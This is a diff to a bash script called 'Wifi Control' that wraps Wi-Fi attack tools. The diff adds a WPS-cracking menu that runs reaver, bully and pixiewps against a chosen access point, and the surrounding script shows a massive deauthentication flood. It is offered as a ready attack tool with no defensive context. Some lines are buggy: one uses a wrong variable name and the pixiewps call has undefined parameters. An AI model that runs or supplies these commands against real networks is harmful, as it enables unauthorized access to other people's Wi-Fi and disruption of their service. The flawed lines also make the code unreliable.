@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # resize terminal window
-resize -s 80 95  > /dev/null
+resize -s 100 100  > /dev/null
 
 #Colors
 green='\e[0;32m'
@@ -32,23 +32,6 @@ echo -e $blue "[ ✔ ] Done installing .... "
 which gnome-terminal > /dev/null 2>&1
 fi
 
-#check if macchanger is installed
-wwhich macchanger > /dev/null 2>&1
-if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] macchanger............................. [ found ] "
-which macchanger > /dev/null 2>&1
-sleep 2
-else
-echo ""
-echo -e $red "[ X ] macchanger -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing macchanger "
-sleep 2
-echo -e $green ""
-sudo apt-get install macchanger -y
-echo -e $blue "[ ✔ ] Done installing .... "
-which macchanger > /dev/null 2>&1
-fi
 
 clear
 echo -e $red "░██╗░░░░░░░██╗██╗███████╗██╗░░░░██╗░█████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░"; sleep 0.2
@@ -59,9 +42,9 @@ echo -e $red "░░╚██╔╝░╚██╔╝░██║██║░░
 echo -e $red "░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚════╝░░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝"; sleep 0.2
 
 echo 
-echo "╔─────────────────────────────────────────╗"; sleep 0.5
-echo "|My Github  https://github.com/moemen-n7  |"; sleep 0.5
-echo "┖─────────────────────────────────────────┙"; sleep 0.5
+echo "╔-----------------------------------------------╗"; sleep 0.5
+echo "|My Github  https://github.com/root69permission |"; sleep 0.5
+echo "┖-----------------------------------------------┙"; sleep 0.5
 sudo cat /etc/issue.net       
 echo 
           echo -e $green"          ""(<1>Monitor mode)"; sleep 0.2
@@ -71,6 +54,8 @@ echo
           echo -e $green"          ""(<3>Mac channger)"; sleep 0.2
 echo 
           echo -e $green"          ""(<4>handshake)"; sleep 0.2
+echo  
+          echo -e $green"          ""(<5>Wps-Cracking)"; sleep 0.2
 echo  
 read -p "          ""Choose from options >> " choose
 echo 
@@ -256,7 +241,7 @@ iwconfig
 sleep 1s
 echo
 clear
-airodump-ng $wlan
+wash -i $wlan
 echo "======================================"; sleep 0.2
  # detect ctrl+c exiting
 trap ctrl_c INT
@@ -273,6 +258,7 @@ clear
 echo -e $yellow" Thanks For Using Wifi Control :)"
 exit
 }
+echo "======================================"; sleep 0.2
 read -p "but the bssid (mac adress):- " mac 
 echo "======================================"; sleep 0.2
 sleep 0.5
@@ -290,13 +276,183 @@ gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $
  gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x aireplay-ng --deauth 10000000 -a $mac $wlan 
 fi
 
+if [ $choose -eq 5 ]
+then 
+#!/bin/bash
+clear
+echo -e $green"░██╗░░░░░░░██╗██████╗░░██████╗░░░░░░░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░"; sleep 0.2
+echo -e $green"░██║░░██╗░░██║██╔══██╗██╔════╝░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░"; sleep 0.2
+echo -e $green"░╚██╗████╗██╔╝██████╔╝╚█████╗░█████╗██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░"; sleep 0.2
+echo -e $green"░░████╔═████║░██╔═══╝░░╚═══██╗╚════╝██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗"; sleep 0.2
+echo -e $green"░░╚██╔╝░╚██╔╝░██║░░░░░██████╔╝░░░░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝"; sleep 0.2
+echo -e $green"░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═════╝░░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░"; sleep 0.2
+
+echo
+echo "               ""<1>Reaver >> "; sleep 0.2
+echo
+echo "               ""<2>bully >> "; sleep 0.2
+echo
+read -p "Choose from options >> " choose 
+echo 
 
 
+
+if [ $choose -eq 1 ]
+then 
+clear
+iwconfig 
+echo 
+echo "================================================="; sleep 0.2
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
+echo "================================================="; sleep 0.2
+sleep 0.5
+echo
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode monitor
+ifconfig $wlan up
+clear
+iwconfig
+sleep 1s
+echo
+clear
+wash -i $wlan
+echo "======================================"; sleep 0.2
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+sleep 1
+echo 
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode managed
+ifconfig $wlan up
+service NetworkManager restart
+clear
+echo -e $yellow" Thanks For Using Wifi Control :)"
+exit
+} 
+echo "======================================"; sleep 0.2
+read -p "but the bssid (mac adress):- " mac 
+echo "======================================"; sleep 0.2
+sleep 0.5
+echo "=========================="; sleep 0.2
+read -p "but the channel:- " ch 
+echo "=========================="; sleep 0.2
+sleep 0.5
+reaver -i $wlan -c $ch -b $mac -vv -L -N -d 15 -T .5 -r 3:15
+fi
+
+
+ 
+
+
+
+
+if [ $choose -eq 2 ]
+then 
+clear
+iwconfig 
+echo 
+echo "================================================="; sleep 0.2
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
+echo "================================================="; sleep 0.2
+sleep 0.5
+echo
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode monitor
+ifconfig $wlan up
+clear
+iwconfig
+sleep 1s
+echo
+clear
+wash -i $wlan
+echo "======================================"; sleep 0.2
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+sleep 1
+echo 
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode managed
+ifconfig $wlan up
+service NetworkManager restart
+clear
+echo -e $yellow" Thanks For Using Wifi Control :)"
+exit
+} 
+echo "======================================"; sleep 0.2
+read -p "but the bssid (mac adress):- " mac 
+echo "======================================"; sleep 0.2
+sleep 0.5
+echo "=========================="; sleep 0.2
+read -p "but the channel:- " ch 
+echo "=========================="; sleep 0.2
+sleep 0.5
+bully $wlan0 -b $mac -c $ch -d -v 3
+fi
+
+if [ $choose -eq 3 ]
+then 
+clear
+iwconfig 
+echo 
+echo "================================================="; sleep 0.2
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
+echo "================================================="; sleep 0.2
+sleep 0.5
+echo
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode monitor
+ifconfig $wlan up
+clear
+iwconfig
+sleep 1s
+echo
+clear
+wash -i $wlan
+echo "======================================"; sleep 0.2
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+sleep 1
+echo 
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode managed
+ifconfig $wlan up
+service NetworkManager restart
+clear
+echo -e $yellow" Thanks For Using Wifi Control :)"
+exit
+} 
+echo "======================================"; sleep 0.2
+read -p "but the bssid (mac adress):- " mac 
+echo "======================================"; sleep 0.2
+sleep 0.5
+echo "=========================="; sleep 0.2
+read -p "but the channel:- " ch 
+echo "=========================="; sleep 0.2
+sleep 0.5
+pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $mac
+fi
+
+
+
+
+ fi
 
 
 echo 
-echo -e $green"    ""╔──────────────────────────────────────────────╗"; sleep 0.5
-echo -e $green"    ""|              <Made by Moemen_N7>             |"; sleep 0.5
-echo -e $green"    ""|https://github.com/moemenkali/Wifi-Control.git|"; sleep 0.5
-echo -e $green"    ""┖──────────────────────────────────────────────┙"; sleep 0.5
+echo -e $green"    ""╔--───────────────────────────────────────────--─╗"; sleep 0.5
+echo -e $green"    ""|              <Made by Moemen_N7>               |"; sleep 0.5
+echo -e $green"    ""|https://github.com/root69permission/Wifi-Control|"; sleep 0.5
+echo -e $green"    ""┖--───────────────────────────────────────────--─┙"; sleep 0.5
 echo -e $yellow"               ""Thanks For Using Wifi Control  :)"; sleep 0.5
